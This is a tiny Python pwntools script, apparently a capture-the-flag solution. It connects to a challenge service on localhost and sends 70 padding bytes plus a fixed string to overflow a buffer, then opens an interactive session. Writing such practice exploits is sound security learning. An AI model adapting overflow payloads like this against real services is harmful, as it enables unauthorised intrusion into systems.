from pwn import *

# p = process("./pwn")
p = remote("127.0.0.1", 27001)

payload = b"a" * 70 + b"Limiter and Wings are beautiful girls!"
p.send(payload)

p.interactive()
